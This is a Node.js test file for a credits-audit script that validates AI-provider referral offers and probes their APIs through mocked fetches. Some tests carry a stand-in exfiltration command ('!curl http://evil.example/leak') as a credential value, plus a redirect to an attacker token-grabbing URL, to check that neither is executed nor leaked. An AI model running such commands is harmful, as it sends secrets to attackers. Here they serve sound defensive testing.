// Offline tests for scripts/audit-credits.mjs — data validation plus fully mocked
// network/credential/protocol regressions. No real Pi profile, no real network.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { readFile, writeFile, mkdtemp, mkdir, rm, stat } from "node:fs/promises";
import { existsSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

import {
  validateCredits,
  normalizeCatalog,
  parseCompletion,
  classifyResult,
  resolveSecret,
  parseArgs,
  runAudit,
  writeReport,
  TIMEOUTS,
} from "../scripts/audit-credits.mjs";

const REPO = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const CLI = path.join(REPO, "scripts", "audit-credits.mjs");

// ---------- helpers ----------

const validOffer = (over = {}) => ({
  provider: "Test Provider",
  credits: "$40 Credits",
  creditsShort: "$40",
  url: "https://example.test/signup?ref=ABC",
  featured: false,
  stars: 3,
  models: ["model-a"],
  ...over,
});

const sse = (...events) => events.map((e) => "data: " + JSON.stringify(e) + "\n\n").join("");

function res(status, body, headers = {}) {
  return {
    status,
    headers: { get: (name) => headers[name.toLowerCase()] ?? null },
    text: async () => body,
  };
}

function mockFetch(routes) {
  const calls = [];
  const fetchImpl = async (url, options = {}) => {
    calls.push({ url: String(url), options });
    for (const route of routes) {
      const hit = typeof route.match === "string" ? String(url).includes(route.match) : route.match.test(String(url));
      if (hit) {
        if (route.throw) throw route.throw;
        return typeof route.response === "function" ? route.response({ url: String(url), options }) : route.response;
      }
    }
    throw new Error("unexpected fetch: " + url);
  };
  return { fetchImpl, calls };
}

async function tmpDir(t, prefix) {
  const dir = await mkdtemp(path.join(os.tmpdir(), prefix));
  t.after(() => rm(dir, { recursive: true, force: true }));
  return dir;
}

async function writeCredits(t, offers, name = "credits.json") {
  const dir = await tmpDir(t, "audit-credits-");
  const file = path.join(dir, name);
  await writeFile(file, JSON.stringify({ offers }));
  return file;
}

async function writePi(t, providers, auth = {}) {
  const dir = await tmpDir(t, "audit-pi-");
  await writeFile(path.join(dir, "models.json"), JSON.stringify({ providers }));
  if (Object.keys(auth).length) await writeFile(path.join(dir, "auth.json"), JSON.stringify(auth));
  return dir;
}

const workingChatSSE = sse(
  { choices: [{ delta: { content: "OK" }, finish_reason: "stop" }] },
);
const workingResponsesSSE = sse(
  { type: "response.output_text.delta", delta: "OK" },
  { type: "response.completed", response: { status: "completed" } },
);

// ---------- validation ----------

test("current credits.json validates cleanly", async () => {
  const data = JSON.parse(await readFile(path.join(REPO, "credits.json"), "utf8"));
  assert.deepEqual(validateCredits(data), []);
});

test("zero-star ratings are accepted", () => {
  assert.deepEqual(validateCredits({ offers: [validOffer({ stars: 0 })] }), []);
});

test("wrong types and ranges are rejected", () => {
  for (const stars of [6, -1, 2.5, "3", null]) {
    const errors = validateCredits({ offers: [validOffer({ stars })] });
    assert.ok(errors.some((e) => e.includes("stars")), `stars ${JSON.stringify(stars)} rejected`);
  }
  const errors = validateCredits({ offers: [validOffer({ featured: "yes" })] });
  assert.ok(errors.some((e) => e.includes("featured")));
});

test("malformed credit labels are rejected", () => {
  for (const credits of ["40 dollars", "Credits", "$", "$40 creditS?"]) {
    const errors = validateCredits({ offers: [validOffer({ credits, creditsShort: "$40" })] });
    assert.ok(errors.length > 0, `label ${credits} rejected`);
  }
});

test("duplicate providers, models, generated ids and urls are rejected", () => {
  const dupProvider = validateCredits({
    offers: [validOffer({ provider: "Alpha" }), validOffer({ provider: "alpha", url: "https://other.test/x", models: ["m2"] })],
  });
  assert.ok(dupProvider.some((e) => e.includes("duplicate provider")));

  const dupModel = validateCredits({ offers: [validOffer({ models: ["m1", "M1"] })] });
  assert.ok(dupModel.some((e) => e.includes("duplicate model")));

  const dupUrl = validateCredits({
    offers: [validOffer(), validOffer({ provider: "Beta", models: ["m2"] })],
  });
  assert.ok(dupUrl.some((e) => e.includes("duplicate URL")));
});

test("empty models are rejected", () => {
  const errors = validateCredits({ offers: [validOffer({ models: [] })] });
  assert.ok(errors.some((e) => e.includes("models")));
});

test("embedded URL credentials are rejected", () => {
  const errors = validateCredits({ offers: [validOffer({ url: "https://user:pass@example.test/x" })] });
  assert.ok(errors.some((e) => e.includes("URL")));
});

test("inconsistent short labels are rejected", () => {
  const errors = validateCredits({ offers: [validOffer({ creditsShort: "$50" })] });
  assert.ok(errors.some((e) => e.includes("creditsShort")));
});

test("structural violations are rejected", () => {
  assert.ok(validateCredits(null).length > 0);
  assert.ok(validateCredits({}).length > 0);
  assert.ok(validateCredits({ offers: [] }).length > 0);
  assert.ok(validateCredits({ offers: [validOffer()], extra: 1 }).length > 0);
  assert.ok(validateCredits({ offers: [validOffer({ unknownField: 1 })] }).length > 0);
  assert.ok(validateCredits({ offers: [{ provider: "X" }] }).length > 0);
  assert.ok(validateCredits({ offers: [validOffer({ url: "http://example.test/x" })] }).length > 0);
  assert.ok(validateCredits({ offers: [validOffer({ models: [" m1"] })] }).length > 0);
});

// ---------- catalog normalization ----------

test("normalizeCatalog reads data and models arrays in known shapes", () => {
  assert.deepEqual(normalizeCatalog({ data: ["a", { id: "b", name: "B" }] }), [
    { id: "a", name: "a", type: undefined },
    { id: "b", name: "B", type: undefined },
  ]);
  assert.deepEqual(normalizeCatalog({ models: [{ model_name: "c", model_spec: { name: "C" }, type: "text" }] }), [
    { id: "c", name: "C", type: "text" },
  ]);
  assert.deepEqual(normalizeCatalog({ data: [{ model: "d" }] }), [{ id: "d", name: "d", type: undefined }]);
  assert.deepEqual(normalizeCatalog({ data: "nope" }), []);
  assert.deepEqual(normalizeCatalog(null), []);
});

// ---------- completion parsing ----------

test("parseCompletion reads chat completions json and streams", () => {
  const json = parseCompletion(JSON.stringify({ choices: [{ message: { content: "OK" } }] }));
  assert.equal(json.text, "OK");
  assert.equal(json.reasoning, "");
  assert.equal(json.error, "");
  assert.equal(json.code, "");
  const streamed = parseCompletion(
    sse({ choices: [{ delta: { content: "O" } }] }, { choices: [{ delta: { content: "K" }, finish_reason: "stop" }] }),
  );
  assert.equal(streamed.text, "OK");
  const reasoned = parseCompletion(sse({ choices: [{ delta: { reasoning_content: "thinking" } }] }));
  assert.equal(reasoned.reasoning, "thinking");
  assert.equal(reasoned.text, "");
});

test("parseCompletion reads responses api json and streams", () => {
  const json = parseCompletion(
    JSON.stringify({ status: "completed", output: [{ content: [{ type: "output_text", text: "OK" }] }] }),
  );
  assert.equal(json.text, "OK");
  assert.equal(parseCompletion(workingResponsesSSE).text, "OK");
  const reasoning = parseCompletion(sse({ type: "response.reasoning_summary_text.delta", delta: "hmm" }));
  assert.equal(reasoning.reasoning, "hmm");
});

test("parseCompletion reads anthropic messages json and streams", () => {
  const json = parseCompletion(JSON.stringify({ content: [{ type: "text", text: "OK" }] }));
  assert.equal(json.text, "OK");
  const streamed = parseCompletion(
    sse(
      { type: "content_block_delta", delta: { type: "thinking_delta", thinking: "plan" } },
      { type: "content_block_delta", delta: { type: "text_delta", text: "OK" } },
    ),
  );
  assert.equal(streamed.text, "OK");
  assert.equal(streamed.reasoning, "plan");
});

test("parseCompletion surfaces errors from json bodies of every protocol", () => {
  assert.equal(parseCompletion(JSON.stringify({ error: { message: "boom", code: "insufficient_quota" } })).error, "boom");
  assert.equal(parseCompletion(JSON.stringify({ error: { message: "boom", code: "insufficient_quota" } })).code, "insufficient_quota");
  assert.equal(parseCompletion(JSON.stringify({ type: "error", error: { type: "overloaded_error", message: "over" } })).code, "overloaded_error");
  assert.equal(parseCompletion(JSON.stringify({ message: "plain" })).error, "plain");
});

test("parseCompletion ignores sse sentinel and junk lines", () => {
  const parsed = parseCompletion('data: [DONE]\n\ndata: not-json\n\nevent: ping\n\n' + workingChatSSE);
  assert.equal(parsed.text, "OK");
});

// ---------- classification ----------

test("HTTP 200 SSE errors are not success", () => {
  const chat = parseCompletion(sse({ error: { message: "no available channel for model claude-x", code: "503" } }));
  assert.equal(chat.error, "no available channel for model claude-x");
  assert.equal(classifyResult(200, chat), "unavailable_model");

  const failed = parseCompletion(
    sse({ type: "response.failed", response: { error: { code: "server_error", message: "upstream down" } } }),
  );
  assert.equal(classifyResult(200, failed), "provider_error");

  const anthropic = parseCompletion(sse({ type: "error", error: { type: "overloaded_error", message: "overloaded" } }));
  assert.notEqual(classifyResult(200, anthropic), "working");

  const quotaStream = parseCompletion(sse({ error: { message: "Insufficient balance", code: null } }));
  assert.equal(classifyResult(200, quotaStream), "quota");
});

test("classifyResult maps statuses and bodies to documented states", () => {
  assert.equal(classifyResult(200, { text: "OK", reasoning: "", error: "", code: "", finished: true }), "working");
  assert.equal(classifyResult(200, { text: "", reasoning: "hmm", error: "", code: "" }), "reasoning_only");
  assert.equal(classifyResult(200, { text: "", reasoning: "", error: "", code: "" }), "incomplete");
  assert.equal(classifyResult(401, { text: "", reasoning: "", error: "", code: "" }), "auth_or_permission");
  assert.equal(classifyResult(403, { text: "", reasoning: "", error: "forbidden", code: "" }), "auth_or_permission");
  assert.equal(classifyResult(402, { text: "", reasoning: "", error: "", code: "" }), "quota");
  assert.equal(classifyResult(429, { text: "", reasoning: "", error: "", code: "" }), "rate_limited");
  assert.equal(classifyResult(500, { text: "", reasoning: "", error: "", code: "" }), "upstream_error");
  assert.equal(classifyResult(404, { text: "", reasoning: "", error: "model not found", code: "" }), "unavailable_model");
  assert.equal(classifyResult(400, { text: "", reasoning: "", error: "无可用渠道", code: "" }), "unavailable_model");
  assert.equal(classifyResult(301, { text: "", reasoning: "", error: "", code: "" }), "redirected");
  assert.equal(classifyResult(null, { text: "", reasoning: "", error: "boom", code: "AbortError" }), "timeout");
  assert.equal(classifyResult(null, { text: "", reasoning: "", error: "boom", code: "TypeError" }), "network_error");
  assert.equal(classifyResult(200, { text: "", reasoning: "", error: "under maintenance", code: "" }), "maintenance");
});

// ---------- secrets ----------

test("resolveSecret resolves literal and env values without executing commands", () => {
  assert.deepEqual(resolveSecret("sk-literal", {}), { value: "sk-literal", reason: "literal credential value" });
  assert.deepEqual(resolveSecret("$AR_KEY", { AR_KEY: "sk-env" }).value, "sk-env");
  assert.deepEqual(resolveSecret("${AR_KEY}!", { AR_KEY: "sk-env" }).value, "sk-env!");
  assert.deepEqual(resolveSecret("a$$b", {}), { value: "a$b", reason: "literal credential value" });
  const missing = resolveSecret("$NOPE_VAR", {});
  assert.equal(missing.value, "");
  assert.match(missing.reason, /not set/);
  const command = resolveSecret("!curl http://evil.example/leak", {});
  assert.equal(command.value, "");
  assert.match(command.reason, /not executed/);
  assert.deepEqual(resolveSecret("", {}), { value: "", reason: "credential value is empty" });
  assert.deepEqual(resolveSecret(42, {}), { value: "", reason: "credential value is not a string" });
});

// ---------- args ----------

test("parseArgs maps flags and defaults", () => {
  assert.deepEqual(parseArgs([]), {
    creditsPath: "credits.json",
    piDir: null,
    catalogs: false,
    live: false,
    reportPath: null,
    help: false,
  });
  const parsed = parseArgs(["--catalogs", "--pi", "/tmp/pi", "--live", "--report", "r.json", "--credits", "c.json"]);
  assert.deepEqual(parsed, {
    creditsPath: "c.json",
    piDir: "/tmp/pi",
    catalogs: true,
    live: true,
    reportPath: "r.json",
    help: false,
  });
});

test("parseArgs resolves bare --pi from PI_CODING_AGENT_DIR or home", () => {
  const previous = process.env.PI_CODING_AGENT_DIR;
  try {
    process.env.PI_CODING_AGENT_DIR = "/custom/pi";
    assert.equal(parseArgs(["--pi"]).piDir, "/custom/pi");
    delete process.env.PI_CODING_AGENT_DIR;
    assert.equal(parseArgs(["--pi"]).piDir, path.join(os.homedir(), ".pi", "agent"));
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
  }
});

test("parseArgs rejects unknown flags", () => {
  assert.throws(() => parseArgs(["--bogus"]));
  assert.equal(parseArgs(["--help"]).help, true);
});

// ---------- report writing ----------

test("existing reports are not overwritten", async (t) => {
  const dir = await tmpDir(t, "audit-report-");
  const existing = path.join(dir, "report.json");
  await writeFile(existing, "KEEP");
  await assert.rejects(() => writeReport(existing, { ok: true }));
  assert.equal(await readFile(existing, "utf8"), "KEEP");

  const fresh = path.join(dir, "sub", "report.json");
  await writeReport(fresh, { ok: true });
  const info = await stat(fresh);
  assert.equal(info.mode & 0o777, 0o600);
  assert.deepEqual(JSON.parse(await readFile(fresh, "utf8")), { ok: true });
});

// ---------- runAudit ----------

test("runAudit validates and reports sources, statuses and diagnostics", async (t) => {
  const creditsPath = await writeCredits(t, [
    validOffer({ provider: "AgentRouter.org", models: ["gpt-x"] }),
  ]);
  const piDir = await writePi(t, {
    agentrouter: {
      api: "openai-responses",
      apiKey: "$AR_KEY",
      baseUrl: "https://agentrouter.test/v1",
      models: [{ id: "gpt-x" }, { id: "gpt-pi-only" }],
    },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/responses", response: res(200, workingResponsesSSE) },
  ]);
  const report = await runAudit({
    creditsPath,
    piDir,
    live: true,
    fetchImpl,
    env: { AR_KEY: "sk-env-ar-secret" },
  });
  assert.equal(report.validation.ok, true);
  const models = report.providers[0].models;
  assert.equal(models.length, 2);
  assert.equal(models[0].model, "gpt-x");
  assert.equal(models[0].sources, "credits+pi");
  assert.equal(models[1].sources, "pi");
  assert.equal(models[0].status, "working");
  assert.equal(models[0].attempted, true);
  assert.equal(models[0].http, 200);
  assert.ok(models[0].textPreview.includes("OK"));
  assert.equal(report.pi.present, true);
  assert.ok(JSON.stringify(report).includes("agentrouter.test"));
  assert.ok(!JSON.stringify(report).includes("sk-env-ar-secret"));
  assert.equal(calls.length, 2); // sequential per provider: one per model
});

test("64-token cap and fixed prompt are sent on every protocol", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "AgentRouter.org", models: ["gpt-x", "claude-y", "deepseek-z"] })]);
  const piDir = await writePi(t, {
    agentrouter: {
      api: "openai-responses",
      apiKey: "sk-literal-ar",
      baseUrl: "https://agentrouter.test/v1",
      models: [],
    },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/responses", response: res(200, workingResponsesSSE) },
    { match: "/chat/completions", response: res(200, workingChatSSE) },
  ]);
  await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
  const bodies = calls.map((c) => JSON.parse(c.options.body));
  const responsesBody = bodies.find((b) => b.max_output_tokens !== undefined);
  const chatBodies = bodies.filter((b) => b.max_tokens !== undefined);
  assert.equal(responsesBody.max_output_tokens, 64);
  assert.equal(responsesBody.store, false);
  assert.equal(responsesBody.input.at(-1).content.at(-1).text, "Reply only with OK.");
  for (const body of chatBodies) {
    assert.equal(body.max_tokens, 64);
    assert.equal(body.messages[0].content, "Reply only with OK.");
    assert.equal(body.stream, true);
  }
  assert.equal(chatBodies.length, 2);
});

test("protocol selection matches the advertised model family", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "AgentRouter.org", models: ["gpt-x", "claude-y", "deepseek-z"] })]);
  const piDir = await writePi(t, {
    agentrouter: { api: "openai-responses", apiKey: "sk-literal-ar", baseUrl: "https://agentrouter.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/responses", response: res(200, workingResponsesSSE) },
    { match: "/chat/completions", response: res(200, workingChatSSE) },
  ]);
  await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
  const byUrl = (fragment) => calls.filter((c) => c.url.includes(fragment)).map((c) => JSON.parse(c.options.body).model);
  assert.deepEqual(byUrl("/responses"), ["gpt-x"]);
  assert.deepEqual(byUrl("/chat/completions").sort(), ["claude-y", "deepseek-z"]);
});

test("working alias survives catalog absence", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "AgentRouter.org", models: ["gpt-hidden-alias"] })]);
  const piDir = await writePi(t, {
    agentrouter: { api: "openai-responses", apiKey: "$AR_KEY", baseUrl: "https://agentrouter.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/models", response: res(200, JSON.stringify({ data: [{ id: "gpt-6.1-sol" }] })) },
    { match: "/responses", response: res(200, workingResponsesSSE) },
  ]);
  const report = await runAudit({ creditsPath, piDir, catalogs: true, live: true, fetchImpl, env: { AR_KEY: "sk-a" } });
  const model = report.providers[0].models[0];
  assert.equal(model.status, "working");
  assert.equal(model.catalogMatch, false);
  assert.equal(model.attempted, true);
  assert.ok(calls.some((c) => c.url.includes("/responses")));
});

test("non-text models are catalog-only", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["img-model", "m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "sk-literal-vyce", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/models", response: res(200, JSON.stringify({ data: [{ id: "img-model", type: "image" }, { id: "m1", type: "text" }] })) },
    { match: "/chat/completions", response: res(200, workingChatSSE) },
  ]);
  const report = await runAudit({ creditsPath, piDir, catalogs: true, live: true, fetchImpl, env: {} });
  const models = report.providers[0].models;
  const img = models.find((m) => m.model === "img-model");
  const text = models.find((m) => m.model === "m1");
  assert.equal(img.status, "catalog_only");
  assert.equal(img.attempted, false);
  assert.equal(text.status, "working");
  const inferenceCalls = calls.filter((c) => c.url.includes("/chat/completions"));
  assert.equal(inferenceCalls.length, 1);
  assert.equal(JSON.parse(inferenceCalls[0].options.body).model, "m1");
});

test("quota stops remaining provider probes", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "B.Ai", models: ["ma", "mb", "mc"] })]);
  const piDir = await writePi(t, {
    b_ai: { api: "openai-completions", apiKey: "$B_KEY", baseUrl: "https://bai.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/chat/completions", response: res(402, JSON.stringify({ error: { message: "Insufficient balance", code: "insufficient_quota" } })) },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: { B_KEY: "sk-b" } });
  const provider = report.providers[0];
  assert.deepEqual(provider.blocked, { model: "ma", status: "quota" });
  const inferenceModels = calls
    .filter((c) => c.url.includes("/chat/completions"))
    .map((c) => JSON.parse(c.options.body).model);
  assert.deepEqual(inferenceModels, ["ma"]);
  for (const name of ["mb", "mc"]) {
    const entry = provider.models.find((m) => m.model === name);
    assert.equal(entry.status, "skipped");
    assert.equal(entry.attempted, false);
    assert.ok(entry.reason.length > 0);
  }
});

test("skipped probes are explicit", async (t) => {
  const creditsPath = await writeCredits(t, [
    validOffer({ provider: "B.Ai", models: ["ma", "mb", "mc"] }),
    validOffer({ provider: "venice.ai", url: "https://venice.test/chat", models: ["V Model"] }),
  ]);
  const piDir = await writePi(t, {
    b_ai: { api: "openai-completions", apiKey: "$B_KEY", baseUrl: "https://bai.test/v1", models: [] },
  });
  const { fetchImpl } = mockFetch([
    { match: "/chat/completions", response: res(402, JSON.stringify({ error: { message: "Insufficient balance" } })) },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: { B_KEY: "sk-b" } });
  const bai = report.providers.find((p) => p.slug === "b-ai" || p.slug.includes("bai"));
  assert.equal(bai.models.length, 3);
  assert.equal(bai.models.filter((m) => !m.attempted).length, 2);
  const venice = report.providers.find((p) => p.slug.includes("venice"));
  for (const entry of venice.models) {
    assert.equal(entry.attempted, false);
    assert.match(entry.reason, /credential/i);
  }
  assert.equal(report.summary.skipped + report.summary.unverified >= 3, true);
});

test("credential commands are not executed", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "!curl http://evil.example/leak", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/chat/completions", response: res(200, workingChatSSE) },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
  const provider = report.providers[0];
  assert.equal(provider.credential.present, false);
  assert.match(provider.credential.reason, /not executed/);
  assert.equal(calls.length, 0);
  const serialized = JSON.stringify(report);
  assert.ok(!serialized.includes("evil.example"));
  assert.ok(!serialized.includes("curl"));
  const entry = provider.models[0];
  assert.equal(entry.attempted, false);
  assert.equal(entry.status, "unverified");
});

test("credentials never cross redirects or reach reports", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "sk-vyce-literal-SECRETVALUE", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    {
      match: "/chat/completions",
      response: res(301, "", { location: "https://evil.test/grab?token=x" }),
    },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
  for (const call of calls) assert.equal(call.options.redirect, "manual");
  assert.equal(calls.length, 1); // redirect target never fetched
  const entry = report.providers[0].models[0];
  assert.equal(entry.status, "redirected");
  assert.equal(entry.attempted, true);
  const serialized = JSON.stringify(report);
  assert.ok(!serialized.includes("SECRETVALUE"));
  assert.ok(!serialized.includes("evil.test"));
});

test("invalid input never loads Pi or fetches", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ stars: 9 })]);
  const piDir = await writePi(t, {
    agentrouter: { api: "openai-responses", apiKey: "$AR_KEY", baseUrl: "https://agentrouter.test/v1", models: [{ id: "gpt-x" }] },
  });
  const { fetchImpl, calls } = mockFetch([]);
  const report = await runAudit({ creditsPath, piDir, catalogs: true, live: true, fetchImpl, env: { AR_KEY: "sk-a" } });
  assert.equal(report.validation.ok, false);
  assert.ok(report.validation.errors.length > 0);
  assert.equal(calls.length, 0);
  assert.ok(!report.pi);
  assert.equal((report.providers ?? []).length, 0);
});

test("unsupported protocols remain unverified", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Weird.ai", models: ["gm1"] })]);
  const piDir = await writePi(t, {
    "weird-ai": { api: "google-genai", apiKey: "$W_KEY", baseUrl: "https://weird.test", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: { W_KEY: "sk-w" } });
  const entry = report.providers[0].models[0];
  assert.equal(entry.status, "unverified");
  assert.equal(entry.attempted, false);
  assert.match(entry.reason, /protocol/i);
  assert.equal(calls.length, 0);
});

test("referral and catalog checks record reachability", async (t) => {
  const creditsPath = await writeCredits(t, [
    validOffer({ provider: "seekai.cc", url: "https://seekai.test/sign-up", models: ["m1"] }),
  ]);
  const { fetchImpl } = mockFetch([
    { match: "seekai.test", response: res(526, "<html>cloudflare</html>") },
    { match: "seekai.cc/api/pricing", response: res(200, JSON.stringify({ data: [{ id: "m1" }] })) },
  ]);
  const report = await runAudit({ creditsPath, catalogs: true, fetchImpl, env: {} });
  const provider = report.providers[0];
  assert.equal(provider.referral.status, 526);
  assert.equal(provider.referral.reachable, false);
  assert.equal(provider.catalog.count, 1);
  assert.equal(provider.models[0].status, "catalog_only");
  assert.equal(provider.models[0].catalogMatch, true);
});

test("missing Pi directory is explicit, not silent", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer()]);
  const { fetchImpl, calls } = mockFetch([]);
  const report = await runAudit({ creditsPath, piDir: "/nonexistent/pi-dir", live: true, fetchImpl, env: {} });
  assert.equal(report.pi.present, false);
  assert.ok(report.pi.reason.length > 0);
  assert.equal(calls.length, 0);
  assert.equal(report.providers[0].models[0].status, "unverified");
});

test("timeouts and body limits are bounded constants", () => {
  assert.equal(TIMEOUTS.metadataMs, 20000);
  assert.equal(TIMEOUTS.inferenceMs, 60000);
  assert.equal(TIMEOUTS.bodyLimitBytes, 2000000);
});

// ---------- CLI ----------

test("importing the module must not run the CLI", () => {
  const child = spawnSync(
    process.execPath,
    ["--input-type=module", "-e", `import "${pathToFileURL(CLI).href}"; console.log("IMPORT_ONLY");`],
    { cwd: REPO, encoding: "utf8" },
  );
  assert.equal(child.status, 0, child.stderr);
  assert.ok(child.stdout.includes("IMPORT_ONLY"));
});

test("CLI help documents every flag", () => {
  const child = spawnSync(process.execPath, [CLI, "--help"], { cwd: REPO, encoding: "utf8" });
  assert.equal(child.status, 0);
  for (const flag of ["--catalogs", "--pi", "--live", "--report", "--credits", "--help"]) {
    assert.ok(child.stdout.includes(flag), `help mentions ${flag}`);
  }
});

test("CLI default run validates the repo credits.json offline", () => {
  const child = spawnSync(process.execPath, [CLI], { cwd: REPO, encoding: "utf8" });
  assert.equal(child.status, 0, child.stdout + child.stderr);
  assert.ok(child.stdout.includes("validation"));
});

test("CLI exits 1 on invalid credit data and 2 on usage errors", async (t) => {
  const bad = await writeCredits(t, [validOffer({ stars: 9 })]);
  const badRun = spawnSync(process.execPath, [CLI, "--credits", bad], { cwd: REPO, encoding: "utf8" });
  assert.equal(badRun.status, 1);

  const unknown = spawnSync(process.execPath, [CLI, "--bogus"], { cwd: REPO, encoding: "utf8" });
  assert.equal(unknown.status, 2);

  const liveOnly = spawnSync(process.execPath, [CLI, "--live"], { cwd: REPO, encoding: "utf8" });
  assert.equal(liveOnly.status, 2);

  const missing = spawnSync(process.execPath, [CLI, "--credits", path.join(os.tmpdir(), "no-such-credits.json")], {
    cwd: REPO,
    encoding: "utf8",
  });
  assert.equal(missing.status, 2);
});

// ---------- final-review fix pass (each test written before its fix) ----------

test("partial streams without a completion marker are not working", async (t) => {
  const partial = parseCompletion(sse({ choices: [{ delta: { content: "OK" } }] })); // no finish_reason
  assert.equal(partial.text, "OK");
  assert.equal(classifyResult(200, partial), "incomplete");

  const responsesPartial = parseCompletion(sse({ type: "response.output_text.delta", delta: "OK" }));
  assert.equal(classifyResult(200, responsesPartial), "incomplete");

  // End-to-end: a stream cut short without any completion marker stays inconclusive.
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "sk-literal-vyce", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const { fetchImpl } = mockFetch([
    { match: "/chat/completions", response: res(200, sse({ choices: [{ delta: { content: "OK" } }] })) },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
  assert.equal(report.providers[0].models[0].status, "incomplete");
});

test("anthropic and responses completion markers gate working", () => {
  const anthropicDone = parseCompletion(
    sse({ type: "content_block_delta", delta: { type: "text_delta", text: "OK" } }, { type: "message_delta", delta: { stop_reason: "end_turn" } }),
  );
  assert.equal(anthropicDone.finished, true);
  assert.equal(classifyResult(200, anthropicDone), "working");
  const anthropicJson = parseCompletion(JSON.stringify({ content: [{ type: "text", text: "OK" }], stop_reason: "end_turn" }));
  assert.equal(anthropicJson.finished, true);
  assert.equal(classifyResult(200, anthropicJson), "working");
});

test("error codes participate in classification and stop provider probes", async (t) => {
  assert.equal(classifyResult(200, { text: "", reasoning: "", error: "request failed", code: "insufficient_quota" }), "quota");
  assert.equal(classifyResult(400, { text: "", reasoning: "", error: "request failed", code: "invalid_api_key" }), "auth_or_permission");
  assert.equal(classifyResult(200, { text: "", reasoning: "", error: "", code: "rate_limit_exceeded" }), "rate_limited");

  const creditsPath = await writeCredits(t, [validOffer({ provider: "B.Ai", models: ["ma", "mb"] })]);
  const piDir = await writePi(t, {
    b_ai: { api: "openai-completions", apiKey: "$B_KEY", baseUrl: "https://bai.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/chat/completions", response: res(200, sse({ error: { code: "insufficient_quota", message: "request failed" } })) },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: { B_KEY: "sk-b" } });
  const provider = report.providers[0];
  assert.equal(provider.models[0].status, "quota");
  assert.deepEqual(provider.blocked, { model: "ma", status: "quota" });
  const probed = calls.filter((c) => c.url.includes("/chat/completions")).map((c) => JSON.parse(c.options.body).model);
  assert.deepEqual(probed, ["ma"]);
  assert.equal(provider.models[1].status, "skipped");
});

test("catalog rows without a type fall back to the name heuristic", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["Flux 3", "m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "sk-literal-vyce", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const { fetchImpl, calls } = mockFetch([
    { match: "/models", response: res(200, JSON.stringify({ data: [{ id: "Flux 3" }, { id: "m1", type: "text" }] })) },
    { match: "/chat/completions", response: res(200, workingChatSSE) },
  ]);
  const report = await runAudit({ creditsPath, piDir, catalogs: true, live: true, fetchImpl, env: {} });
  const models = report.providers[0].models;
  assert.equal(models.find((m) => m.model === "Flux 3").status, "catalog_only");
  assert.equal(models.find((m) => m.model === "Flux 3").attempted, false);
  const probed = calls.filter((c) => c.url.includes("/chat/completions")).map((c) => JSON.parse(c.options.body).model);
  assert.deepEqual(probed, ["m1"]);
});

test("text-capable catalog types are inferred", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "sk-literal-vyce", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const { fetchImpl } = mockFetch([
    { match: "/models", response: res(200, JSON.stringify({ data: [{ id: "m1", type: "llm" }] })) },
    { match: "/chat/completions", response: res(200, workingChatSSE) },
  ]);
  const report = await runAudit({ creditsPath, piDir, catalogs: true, live: true, fetchImpl, env: {} });
  const entry = report.providers[0].models[0];
  assert.equal(entry.status, "working");
  assert.equal(entry.attempted, true);
});

test("timeouts and stream-read failures stay per-model findings", async (t) => {
  assert.equal(classifyResult(null, { text: "", reasoning: "", error: "aborted", code: "TimeoutError" }), "timeout");

